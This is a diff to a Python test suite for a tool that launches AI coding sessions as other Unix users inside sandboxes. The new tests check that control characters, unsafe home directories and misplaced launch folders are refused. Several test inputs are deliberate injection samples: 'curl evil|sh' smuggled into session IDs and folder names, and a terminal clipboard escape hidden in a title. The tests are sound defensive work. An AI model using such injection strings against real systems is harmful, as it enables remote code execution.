@@ -2784,11 +2784,13 @@ class SessionHistory(unittest.TestCase):
 
     def test_other_launch_uid_discovers_through_agent_run(self):
         cat = {**self.cat, "places": {"lobby": {"cwd": self.root, "unix_user": "guest"}}}
-        row = {"session_id": "guest-session", "harness": "grok", "title": "guest work"}
+        row = {"session_id": "guest-session", "harness": "grok", "title": "guest work",
+               "cwd": os.path.realpath(self.root)}
         done = mock.Mock(returncode=0, stdout=json.dumps([row]), stderr="")
         guest_home = os.path.join(self.root, "guest-home")
-        pw = mock.Mock(pw_dir=guest_home, pw_uid=4242)
+        pw = mock.Mock(pw_dir=guest_home, pw_uid=4242, pw_name="guest")
         with mock.patch("pwd.getpwnam", return_value=pw), \
+             mock.patch.object(hm, "_home_ok", return_value=True), \
              mock.patch.object(hm.os, "geteuid", return_value=501), \
              mock.patch.object(hm.shutil, "which", return_value="/usr/local/bin/agent-run"), \
              mock.patch.object(hm.subprocess, "run", return_value=done) as run, \
@@ -3265,8 +3267,9 @@ class TierWalls(unittest.TestCase):
     def tearDown(self):
         shutil.rmtree(self.tmp, ignore_errors=True)
 
-    def _patches(self, euid=501, pw_uid=4242, which=None, trust=True):
+    def _patches(self, euid=None, pw_uid=4242, which=None, trust=True, home_ok=True):
         which = which or {"agent-run": "/usr/local/bin/agent-run", "nono": "/usr/bin/nono"}
+        euid = os.getuid() if euid is None else euid
         pw = mock.Mock(pw_uid=pw_uid, pw_dir=self.home, pw_name="guest")
         out = [
             mock.patch("pwd.getpwnam", return_value=pw),
@@ -3276,6 +3279,8 @@ class TierWalls(unittest.TestCase):
         ]
         if trust:
             out.append(mock.patch.object(hm, "_wall_file_problem", return_value=""))
+        if home_ok:
+            out.append(mock.patch.object(hm, "_home_ok", return_value=True))
         return out
 
     def _confine(self, cat, root, h=None, **kw):
@@ -3497,7 +3502,8 @@ class TierWalls(unittest.TestCase):
             with self.assertRaises(Stop):
                 hm.raise_harness(CAT, h, "seat", self.house, hm.Ctx(cwd=self.house),
                                  reuse_pane={"pane_id": "w1:p1"})
-        self.assertTrue(sent[0].startswith(f"cd -- {self.work} && /usr/local/bin/agent-run guest -- "), sent[0])
+        self.assertTrue(sent[0].startswith(
+            f'cd -P -- {self.work} && [ "$(pwd -P)" = {self.work} ] && /usr/local/bin/agent-run guest -- '), sent[0])
 
     # -- history ----------------------------------------------------------------
 
@@ -3512,12 +3518,103 @@ class TierWalls(unittest.TestCase):
             return hm.launch_history(cat, self.house), run
 
     def test_history_runs_isolated_and_refuses_a_foreign_folder(self):
-        rows, run = self._history([{"session_id": "s", "cwd": self.work}])
+        rows, run = self._history([{"session_id": "s", "cwd": self.house}])
         self.assertEqual(rows[0]["session_id"], "s")
         self.assertEqual(run.call_args[0][0][3:5], [sys.executable, "-I"])
-        with self.assertRaises(SystemExit) as e:
-            self._history([{"session_id": "s", "cwd": "/srv/house/notes"}])
-        self.assertIn("does not own", str(e.exception))
+        for cwd in ("/srv/house/notes", None, self.work):
+            with self.assertRaises(SystemExit) as e:
+                self._history([{"session_id": "s", "cwd": cwd}])
+            self.assertIn("does not own", str(e.exception), cwd)
+
+    def test_history_refuses_a_control_character_session_id(self):
+        for sid in ("abc\x15curl evil|sh\r", "", "a b", "x" * 129, 7):
+            with self.assertRaises(SystemExit) as e:
+                self._history([{"session_id": sid, "cwd": self.house}])
+            self.assertIn("malformed session id", str(e.exception))
+
+    def test_history_strips_control_characters_from_titles(self):
+        rows, _ = self._history([{"session_id": "s1", "cwd": self.house, "title": "\x1b]52;c;ZXZpbA==\x07Fix tests",
+                                  "harness_title": "a\x9bb", "utterance": "u\rv", "name": "n\x15m"}])
+        self.assertEqual((rows[0]["title"], rows[0]["harness_title"], rows[0]["utterance"], rows[0]["name"]),
+                         ("]52;c;ZXZpbA==Fix tests", "ab", "uv", "nm"))
+
+    def test_history_refuses_an_unsound_home(self):
+        cat = {**CAT, "defaults": {**CAT.get("defaults", {}), "session_history": "on"},
+               "places": {"lobby": {"cwd": self.house, "unix_user": "guest"}}}
+        with contextlib.ExitStack() as stack:
+            for p in self._patches(home_ok=False):
+                stack.enter_context(p)
+            with self.assertRaises(SystemExit) as e:
+                hm.launch_history(cat, self.house)
+        self.assertIn("not a directory it owns", str(e.exception))
+
+    # -- control characters and the landing folder ------------------------------
+
+    def test_shell_join_refuses_control_characters(self):
+        for word in ("x\x15y", "x\ry", "x\x7f", "x\ny"):
+            with self.assertRaises(SystemExit):
+                hm.shell_join(["claude", "--resume", word])
+        self.assertEqual(hm.shell_join(["a b", "c"]), "'a b' c")
+
+    def test_a_control_character_root_is_refused_before_the_pane_runs(self):
+        h = {"id": "bash", "kind": "bash", "models": [], "resume": []}
+        bad = self.house + "/x\x15curl evil|sh\r"
+        cat = {**CAT, "places": {"lab": {"cwd": self.house, "unix_user": "guest", "nono_profile": "/etc/w.json"}}}
+        ran = []
+        with contextlib.ExitStack() as stack:
+            for p in self._patches():
+                stack.enter_context(p)
+            stack.enter_context(mock.patch.object(hm, "wait_shell", return_value=None))
+            stack.enter_context(mock.patch.object(hm, "herdr", side_effect=lambda *a, **k: ran.append(a) or {}))
+            with self.assertRaises(SystemExit) as e:
+                hm.raise_harness(cat, h, "seat", bad, hm.Ctx(cwd=self.house), reuse_pane={"pane_id": "w1:p1"})
+        self.assertIn("control character", str(e.exception))
+        self.assertFalse(any(a[:2] == ("pane", "run") for a in ran))
+
+    def test_spawn_refuses_when_the_folder_resolves_elsewhere(self):
+        h = self._guest(kind="bash", models=[], resume=[], nono_profile="/etc/walls/g.json", cwd=self.work)
+        saved = hm.save_roster, hm.load_roster
+        hm.save_roster = lambda rows: None
+        hm.load_roster = lambda: []
+        try:
+            with contextlib.ExitStack() as stack:
+                for p in self._patches():
+                    stack.enter_context(p)
+                stack.enter_context(mock.patch.object(hm, "_expected_cwd", return_value="/somewhere/else"))
+                stack.enter_context(mock.patch.object(hm, "_here_exe", return_value="/bin/true"))
+                with self.assertRaises(SystemExit) as e:
+                    hm.spawn_here(CAT, h, "seat", self.house, hm.Ctx(cwd=self.house))
+        finally:
+            hm.save_roster, hm.load_roster = saved
+        self.assertIn("moved under it", str(e.exception))
+
+    def test_home_ok(self):
+        me = os.getuid()
+        self.assertTrue(hm._home_ok(mock.Mock(pw_dir=self.home, pw_uid=me)))
+        self.assertFalse(hm._home_ok(mock.Mock(pw_dir=self.home, pw_uid=me + 1)))
+        self.assertFalse(hm._home_ok(mock.Mock(pw_dir="/", pw_uid=0)))
+        self.assertFalse(hm._home_ok(mock.Mock(pw_dir=self.door, pw_uid=me)))
+        self.assertFalse(hm._home_ok(mock.Mock(pw_dir="rel", pw_uid=me)))
+        self.assertFalse(hm._uid_owns({}, self.house, mock.Mock(pw_dir="/", pw_uid=0, pw_name="svc")))
+
+    def test_door_owned_by_the_target_or_a_stranger_refuses(self):
+        me = os.getuid()
+        self.assertIn("owned by uid", hm._door_problem({"command": self.door}, target_uid=me))
+        import stat as st_
+        fake = os.stat_result((st_.S_IFREG | 0o755, 0, 0, 1, 504, 20, 10, 0, 0, 0))
+        with mock.patch.object(hm.os, "stat", return_value=fake):
+            self.assertIn("owned by uid 504", hm._door_problem({"command": "/x/door"}))
+
+    def test_door_in_a_group_writable_directory_refuses(self):
+        d = os.path.join(self.tmp, "shared")
+        os.makedirs(d)
+        door = os.path.join(d, "door")
+        Path(door).write_text("#!/bin/sh\n")
+        os.chmod(door, 0o755)
+        os.chmod(d, 0o775)
+        self.assertIn("door directory", hm._door_problem({"command": door}))
+        os.chmod(d, 0o755)
+        self.assertEqual(hm._door_problem({"command": door}), "")
 
     def test_history_without_agent_run_refuses(self):
         with self.assertRaises(SystemExit) as e:
